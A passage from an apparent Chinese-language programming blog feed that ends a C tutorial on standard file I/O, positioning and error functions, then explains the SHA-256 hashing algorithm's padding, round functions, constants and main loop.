class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> filename[] = <span class="string">&quot;./output.txt&quot;</span>; <span class="comment">// 文件名</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *buffer = <span class="string">&quot;Hello, World!\n&quot;</span>; <span class="comment">// 要写入的字符串</span></span><br><span class="line">    <span class="type">size_t</span> buffer_length = <span class="built_in">strlen</span>(buffer); <span class="comment">// 计算字符串长度</span></span><br><span class="line">    <span class="type">size_t</span> written;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以写入模式打开文件，如果文件已存在则覆盖</span></span><br><span class="line">    file = fopen(filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用fwrite()将buffer中的字符串写入到文件中</span></span><br><span class="line">    written = fwrite(buffer, <span class="keyword">sizeof</span>(<span class="type">char</span>), buffer_length, file);</span><br><span class="line">    <span class="comment">// 这里为了简洁期间，省略错误检查的代码</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭文件</span></span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="无格式输入-输出">无格式输入/输出</h2><h3 id="fgetc和fputc">fgetc和fputc</h3><p>这两个函数读写单个字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fgetc</span><span class="params">(FILE * stream)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fputc</span><span class="params">(<span class="type">int</span> ch, FILE * stream)</span>;</span><br></pre></td></tr></table></figure><ul><li>fgetc从文件流 <code>stream</code> 中读取一个字符，作为返回值返回，失败则返回 <code>EOF</code></li><li>fputc向文件流 <code>stream</code> 中写入字符 <code>ch</code>，成功时返回该字符 <code>ch</code>，失败则返回 <code>EOF</code></li></ul><h3 id="fgets和fputs">fgets和fputs</h3><p>这两个函数读写字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> count, FILE * stream)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, FILE * stream)</span>;</span><br></pre></td></tr></table></figure><ul><li>fgets从给定文件流 <code>stream</code> 读取最多 <code>count-1</code> 个字符到缓冲区 <code>str</code> 中，然后写入一个空字符，读取时遇到文件尾或遇到换行符则停止，后一种情况下换行符也被读取到 <code>str</code> 中。成功返回 <code>str</code> ，失败则返回空指针</li><li>fputs将以NULL结尾的字符串 <code>str</code> 写入到输出文件流 <code>stream</code> ，不写入终止空字符。成功返回非负值（该值含义由实现定义），失败则返回 <code>EOF</code></li></ul><h2 id="有格式输入-输出">有格式输入/输出</h2><h3 id="fscanf和fprintf">fscanf和fprintf</h3><p>几乎和scanf和printf一模一样，唯一的区别就是：scanf和printf从 <code>stdin</code> 和 <code>stdout</code> 流输入输出，而fscanf和fprintf从指定的文件流输入输出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fscanf</span><span class="params">(FILE * stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fprintf</span><span class="params">(FILE * stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure><p>这两个函数除了需要把操作的文件流作为第一个参数传入，其他方面和printf与scanf无异，故省略之</p><p>上述函数，读者根据自己的实际情况选择使用即可</p><h1 id="文件定位">文件定位</h1><p>上述的文件读写都是顺序访问，我们有时还需要对文件进行随机访问，此时就需要在文件中进行定位。</p><h2 id="ftell和fseek">ftell和fseek</h2><p>这两个函数用于获取并修改当前文件位置。</p><p>首先了解<code>文件位置指示器</code>：即当前文件指针所指向的文件内容位置距离文件开始处的字节数</p><p><code>ftell</code>函数返回流 <code>stream</code> 的文件位置指示器：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">ftell</span><span class="params">(FILE * stream)</span>;</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>stream：要检验的文件流</li><li>返回值：成功时为文件指示器，失败时为<code>-1L</code></li><li>若流以二进制模式打开，则由此函数获得的值是从文件开始的字节数；</li><li>若流以文本模式打开，则由此函数返回的值未指定，且仅若作为 <code>fseek()</code> 的输入才有意义</li></ul><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;./example.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>); <span class="comment">// 打开文件用于读取</span></span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取一些数据</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    fread(buffer, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">10</span>, file); <span class="comment">// 读取10个字节</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前文件位置</span></span><br><span class="line">    <span class="type">long</span> currentPosition = ftell(file);</span><br><span class="line"><span class="comment">// 文件内容足够的话，currentPosition的值为10</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Current position in file: %ld\n&quot;</span>, currentPosition);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 继续处理文件...</span></span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ftell</code> 用于获取当前文件的文件位置（指示器），而 <code>fseek</code> 用于设置当前文件的文件位置（指示器）<br><code>fseek</code>函数设置文件流 <code>stream</code> 的文件位置指示器为 <code>offset</code> 所指向的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fseek</span><span class="params">(FILE* stream, <span class="type">long</span> offset, <span class="type">int</span> origin)</span>;</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>stream：要修改的文件流</li><li>offset：相对 origin 迁移的字符数</li><li>origin：offset需要加上的位置，值为如下之一：SEEK_SET、SEEK_CUR、SEEK_END（只需要记住宏名即可），分别指示文件首、当前位置和文件尾</li><li>成功时返回 <code>0</code> ，否则为非零</li></ul><p>需要注意：</p><ul><li>若 <code>stream</code> 以二进制模式打开：则新位置被设置为 <code>origin</code> 之后的 <code>offset</code> 字节。<ul><li>若 origin 为 <code>SEEK_SET</code>，则是文件起始之后</li><li>若 origin 为 <code>SEEK_CUR</code>，则是当前文件位置之后</li><li>若 origin 为 <code>SEEK_END</code>，则是文件结尾之后</li><li>不要求二进制流支持 SEEK_END，尤其是当其输出中附加了空字节时</li></ul></li><li>若 <code>stream</code> 以文本模式打开：则 <code>offset</code> 的值仅支持零（可用于任何 origin）和先前在关联到同一个文件的流上对 <code>ftell</code> 的调用的返回值（仅可用于 <code>SEEK_SET</code> ）。</li><li>除了更改文件位置指示器， <code>fseek</code> 还撤销 <code>ungetc</code> 的效果并清除文件尾状态。</li><li>若发生读或写错误，则设置流的错误指示器（ <code>ferror</code> ）而不影响文件位置。</li></ul><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>); <span class="comment">// 打开文件用于读取  </span></span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 定位到文件开头的第100个字节  </span></span><br><span class="line">    <span class="keyword">if</span> (fseek(file, <span class="number">100</span>, SEEK_SET) != <span class="number">0</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;Error seeking file&quot;</span>);  </span><br><span class="line">        fclose(file);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 从当前位置读取数据...  </span></span><br><span class="line">    fclose(file);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fgetpos和fsetpos">fgetpos和fsetpos</h2><p>另一种获取并修改文件位置指示器的方法是使用 <code>fgetpos</code> 和 <code>fsetpos</code>。<br>这两个函数使用一个新的类型 <code>fpos_t</code>，该类型足以唯一指定文件的位置和多字节剖析状态，无需关心其具体实现。</p><p><code>fgetpos</code> 获得文件流 <code>stream</code> 的文件位置指示器和当前分析状态（若存在），并将它们存储于 <code>pos</code> 所指向的对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fgetpos</span><span class="params">(FILE *stream, <span class="type">fpos_t</span> *pos)</span>;</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>stream：要检验的文件流</li><li>pos：指向用于存储获取到的文件位置指示器的 <code>fpos_t</code> 对象的指针</li><li>成功时返回 <code>0</code>，否则返回非零值</li><li>存储的值仅在作为 fsetpos 的输入的情况有意义</li></ul><p><code>fsetpos</code> 设置文件流 <code>stream</code> 的文件位置指示器和多字节分析状态（若存在）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fsetpos</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">fpos_t</span> *pos)</span>;</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>stream：要修改的文件流</li><li>pos：指向 <code>pos_t</code> 对象的指针，用作文件位置指示器的新值</li><li>成功时返回 <code>0</code>，否则返回非零值<br>注意：</li><li>在寻位到宽流的非结尾位置后，下个对任何输出函数的调用可能使剩下的文件内容未定义，例如通过输出不同长度的多字节序列。（例如定位到UTF8编码字符的第二个字符时）</li></ul><h2 id="rewind">rewind</h2><p><code>rewind</code>函数移动文件位置指示器到给定文件流的起始：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rewind</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>该函数等价于调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fseek(stream, <span class="number">0</span>, SEEK_SET);</span><br></pre></td></tr></table></figure><p>但是它会清除文件尾和错误指示器。<br>另外，此函数丢弃任何来自先前对 <code>ungetc</code> 调用的结果。</p><h1 id="对文件的操作">对文件的操作</h1><h2 id="删除文件">删除文件</h2><p><code>remove</code>函数删除 <code>pathname</code> 所标识的文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remove</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname)</span>;</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>pathname：指向空终止字符串的指针，字符串含标识待删除文件的路径</li><li>成功时返回 <code>0</code>，错误时返回非零值<br>若当前有任何进程打开了此文件，则此函数行为是实现定义的（此处略）。</li></ul><h2 id="重命名文件">重命名文件</h2><p><code>rename</code>函数更改文件的文件名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">rename</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *old_filename, <span class="type">const</span> <span class="type">char</span> *new_filename)</span>;</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>old_filename：指向包含要重命名的文件的路径的空终止字符串的指针</li><li>new_filename：指向包含文件新路径的空终止字符串的指针</li><li>成功时返回 <code>0</code>，错误时返回非零值<br>若 <code>new_filename</code> 存在，则行为是实现定义的。</li></ul><h1 id="错误处理">错误处理</h1><h2 id="feof">feof</h2><p><code>feof</code>函数检查是否已抵达给定文件流的结尾：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">feof</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>若已抵达流尾则返回非零值，否则返回<code>0</code>。</p><h2 id="ferror">ferror</h2><p><code>ferror</code>函数检查给定文件流的错误：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ferror</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>若文件流已出现错误则为非零值，否则返回<code>0</code>。</p><h2 id="clearerr">clearerr</h2><p><code>clearerr</code>函数重置给定文件流的错误标志和 <code>EOF</code> 指示器：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">clearerr</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure><br>本章包含了C语言中大部分常用的文件读写、文件定位、文件处理以及错误检查的操作方式，基本足够平时使用。当然，POSIX中还提供了 `read` 和 `write` 系统调用，同样可以实现对文件的读写（使用文件描述符），不在本书讨论范围内。<p>参考资料：</p><ul><li><a href="https://zh.cppreference.com/w/c/io">文件输入/输出 - cppreference.com</a></li></ul><p align=right>——WAHAHA 2024.4.28</p><p>上一篇:<a href="../20249964b6b49f5c">C语言教程-15_2-存储期,作用域与链接</a><br>下一篇:</p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHA-256</title>
      <link href="/2024d47dabb568dd/"/>
      <url>/2024d47dabb568dd/</url>
      
        <content type="html"><![CDATA[<h1 id="sha-2概述">SHA-2概述</h1><p><code>SHA-2</code>安全散列算法2(Secure Hash Algorithm 2)是一种密码散列函数算法标准,由美国国家安全局研发,由美国国家标准与技术研究院(NIST)在2001年发布. 属于SHA算法之一,是<code>SHA-1</code>的后继者. 其下又可再分为六个不同的算法标准,包括了: SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256.</p><p>本文描述<code>SHA-256</code>标准.</p><h1 id="sha-256">SHA-256</h1><h2 id="字节序约定">字节序约定</h2><p>整个<code>SHA-2</code>算法中,均采用<code>大端序</code>来处理数据.</p><p>注意: 与<code>MD5</code>等算法使用<code>小端序</code>不同.</p><h2 id="消息填充">消息填充</h2><p>和<code>MD5</code>,<code>SHA-1</code>类似,在计算摘要之前需要对消息进行填充.</p><ol><li>假定输入消息的长度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>&lt;</mo><msup><mn>2</mn><mn>64</mn></msup></mrow><annotation encoding="application/x-tex">L&lt;2^{64}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span></span>,其中L的单位是<code>bit</code>,在消息后面追加1bit的<code>1</code>.</li><li>然后追加<code>k</code>bit个<code>0</code>,使其满足<code>K</code>为方程<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>L</mi><mo>+</mo><mn>1</mn><mo>+</mo><mi>K</mi><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>512</mn><mo>=</mo><mn>448</mn></mrow><annotation encoding="application/x-tex">( L + 1 + K )\ mod\ 512 = 448</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">L</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">8</span></span></span></span>的最小非负解.</li><li>然后追加一个<code>64-bits</code>的二进制数,即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>的二进制表示,注意为<code>大端序</code>.</li></ol><p>最终填充结果的长度为<code>512-bits</code>的整数倍.</p><h2 id="函数和常量表">函数和常量表</h2><p><code>SHA</code>系列函数会用到一些函数和常量,这里为<code>SHA-256</code>所用到的.<br>注: <code>SHA-256</code>和<code>SHA-224</code>使用相同的数据.</p><h3 id="函数表">函数表</h3><p>下面每一个函数的操作对象都是<code>32-bits</code>的字,返回结果也是一个新的<code>32-bits</code>的字.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CH( x, y, z ) = ( x &amp; y ) ^ ( (~x) &amp; z )</span><br><span class="line"></span><br><span class="line">MAJ( x, y, z ) = ( x &amp; y ) ^ (x &amp; z) ^ (y &amp; z)</span><br><span class="line"></span><br><span class="line">BSIG0( x ) = ( x &gt;&gt;&gt; <span class="number">2</span> ) ^ ( x &gt;&gt;&gt; <span class="number">13</span> ) ^ ( x &gt;&gt;&gt; <span class="number">22</span> )</span><br><span class="line"></span><br><span class="line">BSIG1( x ) = ( x &gt;&gt;&gt; <span class="number">6</span> ) ^ ( x &gt;&gt;&gt; <span class="number">11</span> ) ^ ( x &gt;&gt;&gt; <span class="number">25</span> )</span><br><span class="line"></span><br><span class="line">SSIG0( x ) = ( x &gt;&gt;&gt; <span class="number">7</span> ) ^ ( x &gt;&gt;&gt; <span class="number">18</span> ) ^ ( x &gt;&gt; <span class="number">3</span> )</span><br><span class="line"></span><br><span class="line">SSIG1( x ) = ( x &gt;&gt;&gt; <span class="number">17</span> ) ^ ( x &gt;&gt;&gt; <span class="number">19</span> ) ^ ( x &gt;&gt; <span class="number">10</span> )</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="常量表">常量表</h3><p>使用以下常量<code>K0...K63</code>,其值为前64个素数的立方根的小数部分的前32位.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">428a2f98 71374491 b5c0fbcf e9b5dba5</span><br><span class="line">3956c25b 59f111f1 923f82a4 ab1c5ed5</span><br><span class="line">d807aa98 12835b01 243185be 550c7dc3</span><br><span class="line">72be5d74 80deb1fe 9bdc06a7 c19bf174</span><br><span class="line">e49b69c1 efbe4786 0fc19dc6 240ca1cc</span><br><span class="line">2de92c6f 4a7484aa 5cb0a9dc 76f988da</span><br><span class="line">983e5152 a831c66d b00327c8 bf597fc7</span><br><span class="line">c6e00bf3 d5a79147 06ca6351 14292967</span><br><span class="line">27b70a85 2e1b2138 4d2c6dfc 53380d13</span><br><span class="line">650a7354 766a0abb 81c2c92e 92722c85</span><br><span class="line">a2bfe8a1 a81a664b c24b8b70 c76c51a3</span><br><span class="line">d192e819 d6990624 f40e3585 106aa070</span><br><span class="line">19a4c116 1e376c08 2748774c 34b0bcb5</span><br><span class="line">391c0cb3 4ed8aa4a 5b9cca4f 682e6ff3</span><br><span class="line">748f82ee 78a5636f 84c87814 8cc70208</span><br><span class="line">90befffa a4506ceb bef9a3f7 c67178f2</span><br></pre></td></tr></table></figure><h2 id="计算消息摘要">计算消息摘要</h2><h3 id="初始化">初始化</h3><p><code>SHA-256</code>的初始化常量如下,值为前8个素数的平方根的小数部分的前32位:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">H[<span class="number">0</span>]<span class="number">0</span> = <span class="number">6</span>a09e667</span><br><span class="line">H[<span class="number">0</span>]<span class="number">1</span> = bb67ae85</span><br><span class="line">H[<span class="number">0</span>]<span class="number">2</span> = <span class="number">3</span>c6ef372</span><br><span class="line">H[<span class="number">0</span>]<span class="number">3</span> = a54ff53a</span><br><span class="line">H[<span class="number">0</span>]<span class="number">4</span> = <span class="number">510e527</span>f</span><br><span class="line">H[<span class="number">0</span>]<span class="number">5</span> = <span class="number">9b</span>05688c</span><br><span class="line">H[<span class="number">0</span>]<span class="number">6</span> = <span class="number">1f</span>83d9ab</span><br><span class="line">H[<span class="number">0</span>]<span class="number">7</span> = <span class="number">5b</span>e0cd19</span><br></pre></td></tr></table></figure><h2 id="主循环">主循环</h2><p>主循环遍历每一个分组`M[i], i = 1…N</p><p>对每一个分组如下几步:</p><h3 id="准备消息调度w-预处理消息">准备消息调度W(预处理消息)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> t = <span class="number">0</span> to <span class="number">15</span>:</span><br><span class="line">W[t] = (M[i])[t]</span><br><span class="line"><span class="keyword">for</span> t = <span class="number">16</span> to <span class="number">63</span>:</span><br><span class="line">W[t] = SSIG1( W[t<span class="number">-2</span>] ) + W[t<span class="number">-7</span>] + SSIG0( w[t<span class="number">-15</span>] ) + W[t<span class="number">-16</span>]</span><br></pre></td></tr></table></figure><h3 id="初始化工作变量-a-h">初始化工作变量 a…h</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = H[i<span class="number">-1</span>]<span class="number">0</span></span><br><span class="line">b = H[i<span class="number">-1</span>]<span class="number">1</span></span><br><span class="line">c = H[i<span class="number">-1</span>]<span class="number">2</span></span><br><span class="line">d = H[i<span class="number">-1</span>]<span class="number">3</span></span><br><span class="line">e = H[i<span class="number">-1</span>]<span class="number">4</span></span><br><span class="line">f = H[i<span class="number">-1</span>]<span class="number">5</span></span><br><span class="line">g = H[i<span class="number">-1</span>]<span class="number">6</span></span><br><span class="line">h = H[i<span class="number">-1</span>]<span class="number">7</span></span><br></pre></td></tr></table></figure><h3 id="执行主哈希运算">执行主哈希运算</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> t = <span class="number">0</span> to <span class="number">63</span>:</span><br><span class="line">T1 = h + BSIG1(e) + CH(e,f,g) + Kt + Wt</span><br><span class="line">T2 = BSIG0(a) + MAJ(a,b,c)</span><br><span class="line">h = g</span><br><span class="line">g = f</span><br><span class="line">f = e</span><br><span class="line">e = d + T1</span><br><span class="line">d = c</span><br><span class="line">c = b</span><br><span class="line">b = a</span><br><span class="line">a = T1 + T2</span><br></pre></td></tr></table></figure><h3 id="计算中间哈希值-h-i">计算中间哈希值 H[i]</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">H[i]<span class="number">0</span> = a + H[i<span class="number">-1</span>]<span class="number">0</span></span><br><span class="line">H[i]<span class="number">1</span> = b + H[i<span class="number">-1</span>]<span class="number">1</span></span><br><span class="line">H[i]<span class="number">2</span> = c + H[i<span class="number">-1</span>]<span class="number">2</span></span><br><span class="line">H[i]<span class="number">3</span> = d + H[i<span class="number">-1</span>]<span class="number">3</span></span><br><span class="line">H[i]<span class="number">4</span> = e + H[i<span class="number">-1</span>]<span class="number">4</span></span><br><span class="line">H[i]<span class="number">5</span> = f + H[i<span class="number">-1</span>]<span class="number">5</span></span><br><span class="line">H[i]<span class="number">6</span> = g + H[i<span class="number">-1</span>]<span class="number">6</span></span><br><span class="line">H[i]<span class="number">7</span> = h + H[i<span class="number">-1</span>]<span class="number">7</span></span><br></pre></td></tr></table></figure><h2 id="输出结果">输出结果</h2><p>最终输出的结果就是上述的<code>H[N]0...H[N]7</code>的连接.<br>将其转为16进制即可.</p><h1 id="参阅">参阅</h1><p><a 